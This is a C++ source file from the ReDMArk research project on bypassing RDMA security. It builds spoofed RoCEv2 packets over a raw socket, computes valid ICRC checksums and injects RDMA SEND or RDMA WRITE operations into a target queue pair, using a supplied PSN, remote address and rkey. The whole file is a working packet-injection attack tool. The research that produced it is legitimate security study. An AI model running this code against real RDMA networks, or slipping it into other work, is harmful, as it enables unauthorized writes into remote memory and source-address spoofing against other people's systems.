/**                                                                                                      
 * ReDMArk: Bypassing RDMA Security Mechanisms
 * 
 * Code for injecting rocev2 packets.
 *
 * Copyright (c) 2020-2021 ETH-Zurich. All rights reserved.
 * 
 * Author(s): Konstantin Taranov <konstantin.taranov@inf.ethz.ch>
 * 
 */

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/udp.h>
#include <zlib.h>
#include <chrono>
 
#include <arpa/inet.h>

#define PCKT_LEN 8192
#define ROCEPORT (4791)

#define MLX4_ROCEV2_QP1_SPORT 0xC000

#define htonll(x) ((((uint64_t)htonl(x)) << 32) + htonl((x) >> 32))


#define BTH_DEF_PKEY	(0xffff)
#define BTH_PSN_MASK	(0x00ffffff)
#define BTH_QPN_MASK	(0x00ffffff)
#define BTH_ACK_MASK	(0x80000000)

struct rxe_bth {
	u_int8_t			opcode;
	u_int8_t			flags;
	u_int16_t			pkey;
	u_int32_t			qpn;
	u_int32_t			apsn;
};

struct rxe_reth {
	__be64			va;
	__be32			rkey;
	__be32			len;
};

struct rxe_immdt {
	__be32			imm;
};


const int pseudo_header_length = sizeof(struct udphdr) + sizeof(struct iphdr) + sizeof(rxe_bth);
uint8_t pseudo_header[pseudo_header_length];
struct rxe_bth *pseudo_bth = NULL;


void set_pseudo_header(unsigned char *packet){
	struct iphdr *ip4h = NULL;
	struct udphdr *udph;

	memcpy(pseudo_header, packet, pseudo_header_length);
	ip4h = (struct iphdr *)pseudo_header;
	udph = (struct udphdr *)(ip4h + 1);

	ip4h->ttl = 0xff;
	ip4h->check = htons(0xffff);
	ip4h->tos = 0xff;
	 
	udph->check = htons(0xffff);

	pseudo_bth = (struct rxe_bth *)(udph + 1);

	/* exclude bth.resv8a */
	pseudo_bth->qpn |= htonl(~BTH_QPN_MASK);
}



/* Compute a partial ICRC for all the IB transport headers. */
inline uint32_t rxe_icrc_hdr(unsigned char *packet, uint16_t total_paket_size)
{   
	/* This seed is the result of computing a CRC with a seed of
	 * 0xfffffff and 8 bytes of 0xff representing a masked LRH. */
	uint32_t crc = (0xdebb20e3)^ 0xffffffff;
	crc = crc32(crc, pseudo_header, pseudo_header_length); //crc32_le
	/* And finish to compute the CRC on the remainder of the headers and payload */
	crc = crc32(crc, packet + pseudo_header_length, total_paket_size - pseudo_header_length);
	return crc;
}


 
inline uint16_t ip_checksum(struct iphdr *p_ip_header, size_t len)
{
  register int sum = 0;
  uint16_t *ptr = (unsigned short*)p_ip_header;

  while (len > 1){
    sum += *ptr++;
    len -= 2;
  }

  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);

  return ~sum;
}
 
int main(int argc, char** argv){

    printf("Usage: sudo ./spoofv2 <message size> <number of messages> <Source IP> <Destination IP> <QP number> <PSN> <remote address> <rkey>\n");
	printf("\t By  default it sends IB Send, unless <remote address> <rkey> are specified\n");
	uint32_t payloadsize = atoi (argv[1]);
	uint32_t num_messages = atoi (argv[2]);

	uint8_t padcount = (0b100 - (payloadsize & 0b11)) & 0b11; // payload must be multiple of 4. 
	// other equations for padcount 
	//uint8_t padcount = ((payloadsize + 0x3) & 0b11) - (payloadsize & 0b11); // payload must be multiple of 4. 
	//uint8_t padcount = (-((int32_t)payload)) & 0x3;
	payloadsize+=padcount;


	unsigned char buffer[PCKT_LEN];
	memset(buffer, 0, PCKT_LEN);
	struct iphdr *ip = (struct iphdr *) buffer;
	struct udphdr *udp = (struct udphdr *) (ip + 1);
	struct rxe_bth *bth = (struct rxe_bth *) (udp + 1);
	struct rxe_reth *reth = (struct rxe_reth *) ( ((char*)bth) + sizeof(struct rxe_bth) );
	uint32_t *icrc = (uint32_t *) ( ((char*)bth) + sizeof(struct rxe_bth) + payloadsize  );

	uint16_t total_paket_size = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct rxe_bth) + payloadsize + sizeof(*icrc) ;

	uint8_t opcode = 4; // 4 - IBV_OPCODE_SEND_ONLY
	uint32_t qpn = 1;
	uint32_t psn = 2;

	if(argc > 6){
		qpn = atoi (argv[5]);
		psn = atoi (argv[6]);
	} else{
     return 0;
    }

	if(argc > 8){ // then rdma write
		total_paket_size+= sizeof(struct rxe_reth);
		icrc=icrc+4;
		uint64_t va = atol(argv[7]);
		uint32_t rkey = atoi(argv[8]);
		reth->va = htonll(va);
		reth->rkey = htonl(rkey);
		reth->len = htonl(payloadsize-padcount);  
		opcode = 0x0a; // - IBV_OPCODE_RDMA_WRITE_ONLY
		printf("[%u bytes] RDMA WRITE to QPN=%u with PSN=%u\n",payloadsize-padcount,qpn,psn);
		printf("VA=%lu, rkey=%u\n", va, rkey); 
	}else{
		printf("[%u bytes] RDMA SEND to QPN=%u with PSN=%u\n",payloadsize-padcount,qpn,psn);
	}

 
	ip->ihl      = 5;
	ip->version  = 4;
	ip->tos      = 0; // low delay
	ip->tot_len  = htons(total_paket_size);
	ip->id       = htons (21504);	//Id of this packet 
	ip->frag_off = htons(0x4000);
	ip->ttl      = 64; // hops
	ip->protocol = 17; // UDP
	// source IP address, can use spoofed address here
	ip->check = 0; // fill later or ignored
	ip->saddr = inet_addr(argv[3]);
	ip->daddr = inet_addr(argv[4]);


	udp->source = htons(MLX4_ROCEV2_QP1_SPORT);
	// destination port number
	udp->dest = htons(ROCEPORT);
	udp->len = htons(total_paket_size - sizeof(struct iphdr));
	udp->check = 0;// fill later or ignored


	//https://github.com/SoftRoCE/rxe-dev/blob/master/drivers/infiniband/hw/rxe/rxe_hdr.h
	bth->opcode = opcode; //8bit
	bth->flags = 0b00000000; // padding is here
	bth->flags |= padcount << 4 ; // it adds padcount (i.e. how many bytes crop from payload at destination)! 

	bth->pkey = htons(BTH_DEF_PKEY);
	bth->qpn = htonl(qpn);

	set_pseudo_header(buffer);

	int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	struct sockaddr_in dst_addr;
	dst_addr.sin_family = AF_INET;
	dst_addr.sin_port = htons(ROCEPORT);
	dst_addr.sin_addr.s_addr = ip->daddr;

	auto start = std::chrono::steady_clock::now();
	for(uint32_t i =0; i < num_messages; i++){
		bth->apsn = htonl(BTH_PSN_MASK & psn);
	//	bth->apsn |= htonl(BTH_ACK_MASK); 
		pseudo_bth->apsn = bth->apsn;
		*icrc = (rxe_icrc_hdr(buffer,total_paket_size - sizeof(*icrc)));
		int ret =  sendto(raw_sock, buffer, total_paket_size, 0, (struct sockaddr *)&dst_addr, sizeof(dst_addr)) ;
		psn+=1;
	}
	auto end = std::chrono::steady_clock::now();
	printf("Time in micro %lu \n",std::chrono::duration_cast<std::chrono::microseconds>(end - start).count());

  return 0;
}
